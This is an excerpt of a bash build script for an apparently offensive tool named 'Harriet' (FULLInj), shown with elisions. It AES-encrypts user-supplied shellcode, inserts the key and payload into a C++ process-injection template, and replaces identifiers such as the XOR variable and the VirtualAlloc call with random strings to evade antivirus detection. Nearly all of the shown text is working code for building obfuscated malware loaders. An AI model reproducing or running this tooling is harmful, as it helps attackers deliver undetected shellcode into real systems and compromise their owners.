...
\_|  |_|  \___/ \___\___||___/___/  \___/_| |_| |\___|\___|\__|_|\___/|_| |_|
                                             _/ |                            
                                            |__/                             
EOF
...
#Copying Templates
cp Harriet/FULLInj/xor.py Harriet/FULLInj/Resources/xor.py
cp Harriet/FULLInj/template.cpp Harriet/FULLInj/Resources/template.cpp
echo -e ${yellow}"+++Encrypting Payload+++" ${clear}
echo ""
sleep 2
#Getting AES Values
python3 Harriet/FULLInj/Resources/aesencrypt.py $Shellcode > shell.txt
...
keys=$(cat shell3.txt)
keysnow=${keys#*=}
sed -i "s/KEYVALUE/$keysnow/g" Harriet/FULLInj/Resources/template.cpp

payload=$(cat "shell.txt")
payloadnow=${payload#*;}
payloadtoday=${payloadnow#*=}
echo $payloadtoday > shell5.txt
perl -pe 's/PAYVAL/`cat shell5.txt`/ge' -i Harriet/FULLInj/Resources/template.cpp
sleep 2
...
sed -i "s/Random1/$Random1/g" Harriet/FULLInj/Resources/template.cpp
#FindTarget
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-18} | head -n 1 > shell.txt
Random2=$(cat shell.txt)
sed -i "s/Random2/$Random2/g" Harriet/FULLInj/Resources/template.cpp
#Inject
...
sed -i "s/XOR_VARIABLE/$XOR_VARIABLE/g" Harriet/FULLInj/Resources/template.cpp
...
sed -i "s/Alloc_Virtual/$VIRT_ALLOC/g" Harriet/FULLInj/Resources/template.cpp
rm virt*
